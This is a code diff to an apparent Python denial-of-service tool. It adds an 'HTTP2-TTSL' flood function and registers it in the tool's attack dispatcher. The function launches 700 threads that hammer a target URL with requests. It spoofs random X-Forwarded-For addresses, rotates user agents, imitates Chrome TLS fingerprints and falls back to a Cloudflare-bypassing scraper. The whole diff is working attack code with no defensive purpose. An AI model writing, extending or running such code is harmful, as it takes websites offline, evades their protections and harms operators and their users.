@@ -9,7 +9,6 @@ import json
 import ssl
 from struct import pack as data_pack
 
-
 _made__ = "Alexander"
 
 try:
@@ -86,6 +85,44 @@ def get_proxies():
             return proxies
     except:
         return []
+
+def http2_ttsl_attack(target_url, duration, threads=700):
+    end_time = time.time() + duration
+    user_agents = MyUser_Agent()
+    ciphers = [
+        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
+    ]
+    
+    def attack_thread():
+        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'mobile': False, 'platform': 'windows'})
+        while time.time() < end_time:
+            try:
+                headers = {
+                    "User-Agent": random.choice(user_agents),
+                    "Cache-Control": "max-age=0",
+                    "Referer": target_url,
+                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+                    "Cookie": ""
+                }
+                # محاكاة سلوك HTTP/2 TLS عبر curl_cffi المتقدمة
+                curl_requests.get(
+                    target_url, 
+                    headers=headers, 
+                    impersonate="chrome120", 
+                    timeout=10, 
+                    ssl_version=ssl.PROTOCOL_TLSv1_3
+                )
+            except:
+                try:
+                    scraper.get(target_url, timeout=10)
+                except:
+                    pass
+
+    for _ in range(threads):
+        Thread(target=attack_thread, daemon=True).start()
+    time.sleep(duration)
 
 def launch_bypass_https(url, duration, threads=700):
     end_time = time.time() + duration
@@ -175,6 +212,8 @@ def execute_attack(method, ip, port, duration):
         launch_bypass_https(ip, duration)
     elif m == "OVH-UDP":
         ovh_udp_attack(ip, port, duration)
+    elif m == "HTTP2-TTSL":
+        http2_ttsl_attack(ip, duration)
     
     print(f"[!] Task Finished: {m}")
 
